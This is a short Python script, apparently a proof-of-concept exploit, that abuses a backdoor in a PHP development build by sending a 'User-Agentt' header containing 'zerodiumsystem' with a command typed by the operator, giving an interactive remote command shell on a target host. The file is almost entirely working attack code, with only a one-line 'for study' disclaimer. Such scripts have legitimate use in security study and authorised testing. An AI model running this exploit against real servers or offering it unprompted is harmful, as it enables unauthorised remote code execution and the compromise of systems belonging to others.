import argparse
import os

import requests

"""
This exploit was developed for study.
I wasn't the one who discovered this vulnerability!

by: bielzao
"""


def exploit(host, req):
    try:
        while 1:
            cmd = input("[*] Exec: ")
            print("\n")
            payload = f"zerodiumsystem('{cmd}');"
            headers = {
                "User-Agent": "hacked",
                "User-Agentt": payload,
            }
            res = req.get(host, headers=headers, allow_redirects=False)
            page = res.text
            result_full = page.split("<!DOCTYPE html>", 1)
            result_clean = result_full[0].split("\n")

            count = 1
            os.system("clear")
            for word in result_clean:
                print(word, end="  ")
                count += 1

                if count % 6 == 0:
                    print("\n", end="")
            print("\n")

    except KeyboardInterrupt:
        print("\nOkay! exiting...")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", help="Specify the host. Ex: 10.10.10.10")

    args = parser.parse_args()

    if args.target:
        req = requests.Session()
        host = "http://" + str(args.target)
        exploit(host, req)


if __name__ == "__main__":
    main()
